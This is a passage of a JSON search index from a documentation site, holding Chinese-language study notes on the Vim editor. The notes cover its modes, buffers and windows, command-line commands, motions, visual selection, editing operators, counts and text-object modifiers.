<li>Command\u6a21\u5f0f\uff08\u547d\u4ee4\u884c\uff09\u2014\u2014&gt;\u6309\u4e0b <code>:</code> \u5c31\u53ef\u4ee5\u8fdb\u5165\uff0c</li> </ol> Note <ul> <li>\u5728\u4e0d\u540c\u64cd\u4f5c\u6a21\u5f0f\u4e0b\uff0c\u952e\u76d8\u6572\u51fb\u7684\u542b\u4e49\u4e5f\u4e0d\u540c\uff0c\u6bd4\u5982\uff0c<code>x</code> \u5728\u63d2\u5165\u6a21\u5f0f\u4f1a\u63d2\u5165\u5b57\u6bcd <code>x</code>\uff0c\u4f46\u662f\u5728\u6b63\u5e38\u6a21\u5f0f \u4f1a\u5220\u9664\u5f53\u524d\u5149\u6807\u6240\u5728\u7684\u5b57\u6bcd\uff0c\u5728\u53ef\u89c6\u6a21\u5f0f\u4e0b\u5219\u4f1a\u5220\u9664\u9009\u4e2d\u6587\u5757\u3002</li> <li>\u5728\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0cVim\u4f1a\u5728\u5de6\u4e0b\u89d2\u663e\u793a\u5f53\u524d\u7684\u6a21\u5f0f\u3002 Vim\u542f\u52a8\u65f6\u7684\u9ed8\u8ba4\u6a21\u5f0f\u662f\u6b63\u5e38\u6a21\u5f0f\u3002\u901a\u5e38\u4f60\u4f1a\u628a\u5927\u90e8\u5206 \u65f6\u95f4\u82b1\u5728\u6b63\u5e38\u6a21\u5f0f\u548c\u63d2\u5165\u6a21\u5f0f\u3002</li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_4", "title": "\u57fa\u672c\u64cd\u4f5c", "text": ""}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_5", "title": "\u63d2\u5165\u6587\u672c", "text": "<p>\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u952e\u5165 <code>i</code> \u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\u3002\u73b0\u5728 Vim \u8ddf\u5f88\u591a\u5176\u4ed6\u7684\u7f16\u8f91\u5668\u4e00\u6837\uff0c\u76f4\u5230\u4f60\u952e\u5165 \u8fd4\u56de\u6b63\u5e38\u6a21\u5f0f\u3002 \u4f60\u53ea\u9700\u8981\u638c\u63e1\u8fd9\u4e00\u70b9\u548c\u4e0a\u9762\u4ecb\u7ecd\u7684\u6240\u6709\u57fa\u7840\u77e5\u8bc6\u5c31\u53ef\u4ee5\u4f7f\u7528 Vim \u6765\u7f16\u8f91\u6587\u4ef6\u4e86 \uff08\u867d\u7136\u5982\u679c\u4f60\u4e00\u76f4\u505c\u7559\u5728\u63d2\u5165\u6a21\u5f0f\u5185\u4e0d\u4e00\u5b9a\u9ad8\u6548\uff09\u3002"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_6", "title": "\u7f13\u5b58\u3001\u6807\u7b7e\u9875\u3001\u7a97\u53e3", "text": "<ul> <li>Vim \u4f1a\u7ef4\u62a4\u4e00\u7cfb\u5217\u6253\u5f00\u7684\u6587\u4ef6\uff0c\u79f0\u4e3a\u201c\u7f13\u5b58\u201d\u3002\u4e00\u4e2a Vim \u4f1a\u8bdd\u5305\u542b\u4e00\u7cfb\u5217\u6807\u7b7e\u9875\uff0c\u6bcf\u4e2a\u6807\u7b7e\u9875\u5305\u542b \u4e00\u7cfb\u5217\u7a97\u53e3\uff08\u5206\u9694\u9762\u677f\uff09\u3002\u6bcf\u4e2a\u7a97\u53e3\u663e\u793a\u4e00\u4e2a\u7f13\u5b58\u3002\u8ddf\u7f51\u9875\u6d4f\u89c8\u5668\u7b49\u5176\u4ed6\u4f60\u719f\u6089\u7684\u7a0b\u5e8f\u4e0d\u4e00\u6837\u7684\u662f\uff0c \u7f13\u5b58\u548c\u7a97\u53e3\u4e0d\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u5173\u7cfb\uff1b\u7a97\u53e3\u53ea\u662f\u89c6\u89d2\u3002\u4e00\u4e2a\u7f13\u5b58\u53ef\u4ee5\u5728\u591a\u4e2a\u7a97\u53e3\u6253\u5f00\uff0c\u751a\u81f3\u5728\u540c\u4e00\u4e2a\u6807\u7b7e\u9875\u5185\u7684\u591a\u4e2a\u7a97\u53e3\u6253\u5f00\u3002\u8fd9\u4e2a\u529f\u80fd\u5176\u5b9e\u5f88\u597d\u7528\uff0c\u6bd4\u5982\u5728\u67e5\u770b\u540c\u4e00\u4e2a\u6587\u4ef6\u7684\u4e0d\u540c\u90e8\u5206\u7684\u65f6\u5019\u3002</li> <li>Vim \u9ed8\u8ba4\u6253\u5f00\u4e00\u4e2a\u6807\u7b7e\u9875\uff0c\u8fd9\u4e2a\u6807\u7b7e\u4e5f\u5305\u542b\u4e00\u4e2a\u7a97\u53e3\u3002<ul> <li>\uff1atabnew (\u6587\u4ef6\u540d)\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7a97\u53e3\u6253\u5f00\u6587\u4ef6\uff0c Normal\u6a21\u5f0f\u4e0b gt \u53ef\u4ee5\u5728\u7a97\u53e3\u4e4b\u95f4\u5207\u6362\u3002</li> <li>\u6b64\u65f6\u6211\u4eec\u8f93\u5165 <code>:q</code> \u4e0d\u4f1a\u5b8c\u5168\u9000\u51faVim\u53ea\u4f1a\u5173\u95ed\u5f53\u524d\u7a97\u53e3\uff0c\u53ea\u6709\u6ca1\u6709\u7a97\u53e3\u7684\u65f6\u5019\u624d\u4f1a\u9000\u51faVim</li> </ul> </li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#vim_2", "title": "\u547d\u4ee4\u884c\u4e0b\u7684vim\u547d\u4ee4", "text": "<ul> <li>\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\u952e\u5165 : \u8fdb\u5165\u547d\u4ee4\u884c\u6a21\u5f0f\u3002 \u5728\u952e\u5165 : \u540e\uff0c\u4f60\u7684\u5149\u6807\u4f1a\u7acb\u5373\u8df3\u5230\u5c4f\u5e55\u4e0b\u65b9\u7684\u547d\u4ee4\u884c\u3002 \u8fd9\u4e2a\u6a21\u5f0f\u6709\u5f88\u591a\u529f\u80fd\uff0c\u5305\u62ec\u6253\u5f00\uff0c\u4fdd\u5b58\uff0c\u5173\u95ed\u6587\u4ef6\uff0c\u4ee5\u53ca \u9000\u51fa Vim\u3002<ul> <li><code>:q</code> \u9000\u51fa\uff08\u5173\u95ed\u7a97\u53e3\uff09</li> <li><code>:w</code> \u4fdd\u5b58\uff08\u5199\uff09</li> <li><code>:wq</code> \u4fdd\u5b58\u7136\u540e\u9000\u51fa</li> <li><code>:qa</code> \u4f1a\u5173\u95ed\u6240\u6709\u7a97\u53e3</li> <li><code>:e</code> {\u6587\u4ef6\u540d} \u6253\u5f00\u8981\u7f16\u8f91\u7684\u6587\u4ef6</li> <li><code>:ls</code> \u663e\u793a\u6253\u5f00\u7684\u7f13\u5b58</li> <li><code>:help</code> {\u6807\u9898} \u6253\u5f00\u5e2e\u52a9\u6587\u6863<ul> <li><code>:help :w</code> \u6253\u5f00 <code>:w</code> \u547d\u4ee4\uff08Command\u6a21\u5f0f\uff09\u7684\u5e2e\u52a9\u6587\u6863</li> <li><code>:help w</code> \u6253\u5f00 <code>w</code> \u79fb\u52a8\uff08Normal\u6a21\u5f0f\uff09\u7684\u5e2e\u52a9\u6587\u6863</li> </ul> </li> <li>Normal\u6a21\u5f0f\u4e0b\u8f93\u5165 <code>s</code> \u4f1a\u5220\u9664\u5b57\u7b26\u5e76\u8fdb\u5165Insert\u6a21\u5f0f</li> </ul> </li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#vim_3", "title": "Vim\u7684\u63a5\u53e3\u5176\u5b9e\u662f\u4e00\u79cd\u7f16\u7a0b\u8bed\u8a00", "text": "<ul> <li>Vim \u6700\u91cd\u8981\u7684\u8bbe\u8ba1\u601d\u60f3\u662f Vim \u7684\u754c\u9762\u672c\u8eab\u662f\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\u3002\u952e\u5165\u64cd\u4f5c \uff08\u4ee5\u53ca\u4ed6\u4eec\u7684\u52a9\u8bb0\u540d\uff09 \u672c\u8eab\u662f\u547d\u4ee4\uff0c \u8fd9\u4e9b\u547d\u4ee4\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\u3002 \u8fd9\u4f7f\u5f97\u79fb\u52a8\u548c\u7f16\u8f91\u66f4\u52a0\u9ad8\u6548\uff0c\u7279\u522b\u662f\u4e00\u65e6\u5f62\u6210\u808c\u8089\u8bb0\u5fc6\u3002</li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_7", "title": "\u79fb\u52a8", "text": "<ul> <li>\u591a\u6570\u65f6\u5019\u4f60\u4f1a\u5728\u6b63\u5e38\u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528\u79fb\u52a8\u547d\u4ee4\u5728\u7f13\u5b58\u4e2d\u5bfc\u822a\u3002\u5728 Vim \u91cc\u9762\u79fb\u52a8\u4e5f\u88ab\u79f0\u4e3a \u201c\u540d\u8bcd\u201d\uff0c \u56e0\u4e3a\u5b83\u4eec\u6307\u5411\u6587\u5b57\u5757\u3002<ul> <li>\u57fa\u672c\u79fb\u52a8: <code>hjkl</code> \uff08\u5de6\uff0c \u4e0b\uff0c \u4e0a\uff0c \u53f3\uff09</li> <li>\u8bcd\uff1a <code>w</code> \uff08\u4e0b\u4e00\u4e2a\u8bcd\uff09\uff0c <code>b</code> \uff08\u8bcd\u521d\uff09\uff0c <code>e</code> \uff08\u8bcd\u5c3e\uff09</li> <li>\u884c\uff1a <code>0</code> \uff08\u884c\u521d\uff09\uff0c <code>^</code> \uff08\u7b2c\u4e00\u4e2a\u975e\u7a7a\u683c\u5b57\u7b26\uff09\uff0c <code>$</code> \uff08\u884c\u5c3e\uff09</li> <li>\u5c4f\u5e55\uff1a <code>H</code> \uff08\u5c4f\u5e55\u9996\u884c\uff09\uff0c <code>M</code> \uff08\u5c4f\u5e55\u4e2d\u95f4\uff09\uff0c <code>L</code> \uff08\u5c4f\u5e55\u5e95\u90e8\uff09</li> <li>\u7ffb\u9875\uff1a <code>Ctrl-u</code> \uff08\u4e0a\u7ffb\uff09\uff0c <code>Ctrl-d</code> \uff08\u4e0b\u7ffb\uff09</li> <li>\u6587\u4ef6\uff1a <code>gg</code> \uff08\u6587\u4ef6\u5934\uff09\uff0c <code>G</code> \uff08\u6587\u4ef6\u5c3e\uff09</li> <li>\u884c\u6570\uff1a :<code>{\u884c\u6570}&lt;CR&gt;</code> \u6216\u8005 <code>{\u884c\u6570}G</code> ({\u884c\u6570}\u4e3a\u884c\u6570)</li> <li>\u6742\u9879\uff1a <code>%</code> \uff08\u627e\u5230\u914d\u5bf9\uff0c\u6bd4\u5982\u62ec\u53f7\u6216\u8005 /* */ \u4e4b\u7c7b\u7684\u6ce8\u91ca\u5bf9\uff09</li> <li>\u67e5\u627e\uff1a <code>f</code> {\u5b57\u7b26}\uff0c <code>t</code> {\u5b57\u7b26}\uff0c <code>F</code> {\u5b57\u7b26}\uff0c <code>T</code> {\u5b57\u7b26}</li> <li>\u67e5\u627e/\u5230 \u5411\u524d/\u5411\u540e \u5728\u672c\u884c\u7684{\u5b57\u7b26}</li> <li><code>, / ;</code> \u7528\u4e8e\u5bfc\u822a\u5339\u914d</li> <li>\u641c\u7d22: <code>/{\u6b63\u5219\u8868\u8fbe\u5f0f}</code>, <code>n</code> / <code>N</code> \u7528\u4e8e\u5bfc\u822a\u5339\u914d</li> </ul> </li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_8", "title": "\u9009\u62e9", "text": "<ul> <li>\u53ef\u89c6\u5316\u6a21\u5f0f:<ul> <li>\u53ef\u89c6\u5316\uff1a<code>v</code></li> <li>\u53ef\u89c6\u5316\u884c\uff1a <code>V</code></li> <li>\u53ef\u89c6\u5316\u5757\uff1a<code>Ctrl+v</code></li> </ul> </li> <li>\u53ef\u4ee5\u7528\u79fb\u52a8\u547d\u4ee4\u6765\u9009\u4e2d\u3002</li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_9", "title": "\u7f16\u8f91", "text": "<ul> <li>\u6240\u6709\u4f60\u9700\u8981\u7528\u9f20\u6807\u505a\u7684\u4e8b\uff0c \u4f60\u73b0\u5728\u90fd\u53ef\u4ee5\u7528\u952e\u76d8\uff1a\u91c7\u7528\u7f16\u8f91\u547d\u4ee4\u548c\u79fb\u52a8\u547d\u4ee4\u7684\u7ec4\u5408\u6765\u5b8c\u6210\u3002 \u8fd9\u5c31\u662f Vim \u7684\u754c\u9762\u5f00\u59cb\u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\u7684\u65f6\u5019\u3002Vim \u7684\u7f16\u8f91\u547d\u4ee4\u4e5f\u88ab\u79f0\u4e3a \u201c\u52a8\u8bcd\u201d\uff0c \u56e0\u4e3a\u52a8\u8bcd\u53ef\u4ee5\u65bd\u52a8\u4e8e\u540d\u8bcd\u3002<ul> <li><code>i</code> \u8fdb\u5165\u63d2\u5165\u6a21\u5f0f</li> <li>\u4f46\u662f\u5bf9\u4e8e\u64cd\u7eb5/\u7f16\u8f91\u6587\u672c\uff0c\u4e0d\u5355\u60f3\u7528\u9000\u683c\u952e\u5b8c\u6210</li> <li><code>O</code> / <code>o</code> \u5728\u4e4b\u4e0a/\u4e4b\u4e0b\u63d2\u5165\u884c</li> <li><code>d</code>} \u5220\u9664 {\u79fb\u52a8\u547d\u4ee4</li> <li>\u4f8b\u5982\uff0c <code>dw</code> \u5220\u9664\u8bcd, <code>d$</code> \u5220\u9664\u5230\u884c\u5c3e, <code>d0</code> \u5220\u9664\u5230\u884c\u5934\u3002</li> <li><code>c</code>} \u6539\u53d8 {\u79fb\u52a8\u547d\u4ee4</li> <li>\u4f8b\u5982\uff0c <code>cw</code> \u6539\u53d8\u8bcd</li> <li>\u6bd4\u5982 <code>d</code> \u518d <code>i</code></li> <li><code>x</code> \u5220\u9664\u5b57\u7b26\uff08\u7b49\u540c\u4e8e <code>dl</code>\uff09</li> <li><code>s</code> \u66ff\u6362\u5b57\u7b26\uff08\u7b49\u540c\u4e8e <code>xi</code>\uff09</li> <li>\u53ef\u89c6\u5316\u6a21\u5f0f + \u64cd\u4f5c</li> <li>\u9009\u4e2d\u6587\u5b57, <code>d</code> \u5220\u9664 \u6216\u8005 <code>c</code> \u6539\u53d8</li> <li><code>u</code> \u64a4\u9500, <code>&lt;C-r&gt;</code> \u91cd\u505a</li> <li><code>y</code> \u590d\u5236 / <code>yank</code> \uff08\u5176\u4ed6\u4e00\u4e9b\u547d\u4ee4\u6bd4\u5982 <code>d</code> \u4e5f\u4f1a\u590d\u5236\uff09</li> <li><code>p</code> \u7c98\u8d34</li> <li>\u66f4\u591a\u503c\u5f97\u5b66\u4e60\u7684: \u6bd4\u5982 <code>~</code> \u6539\u53d8\u5b57\u7b26\u7684\u5927\u5c0f\u5199</li> </ul> </li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_10", "title": "\u8ba1\u6570", "text": "<ul> <li>\u4f60\u53ef\u4ee5\u7528\u4e00\u4e2a\u8ba1\u6570\u6765\u7ed3\u5408\u201c\u540d\u8bcd\u201d\u548c\u201c\u52a8\u8bcd\u201d\uff0c\u8fd9\u4f1a\u6267\u884c\u6307\u5b9a\u64cd\u4f5c\u82e5\u5e72\u6b21\u3002<ul> <li><code>3w</code> \u5411\u524d\u79fb\u52a8\u4e09\u4e2a\u8bcd</li> <li><code>5j</code> \u5411\u4e0b\u79fb\u52a85\u884c</li> <li><code>7dw</code> \u5220\u96647\u4e2a\u8bcd</li> </ul> </li> </ul>"}, {"location": "Triviality/The%20Missing%20Semester/Vim/#_11", "title": "\u4fee\u9970\u8bed", "text": "<ul> <li>\u4f60\u53ef\u4ee5\u7528\u4fee\u9970\u8bed\u6539\u53d8\u201c\u540d\u8bcd\u201d\u7684\u610f\u4e49\u3002\u4fee\u9970\u8bed\u6709 i\uff0c\u8868\u793a\u201c\u5185\u90e8\u201d\u6216\u8005\u201c\u5728\u5185\u201c\uff0c\u548c a\uff0c \u8868\u793a\u201d\u5468\u56f4\u201c\u3002<ul> <li><code>ci(</code> \u6539\u53d8\u5f53\u524d\u62ec\u53f7\u5185\u7684\u5185\u5bb9</li> <li><code>ci[</code> \u6539\u53d8\u5f53\u524d\u65b9\u62ec\u53f7\u5185\u7684\u5185\u5bb9</li> <li><code>da'</code> \u5220\u9664\u4e00\u4e2a\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\uff0c \u5305\u62ec\u5468\u56f4\u7684\u5355\u5f15\u53f7</li> </ul> </li> </ul>"}]}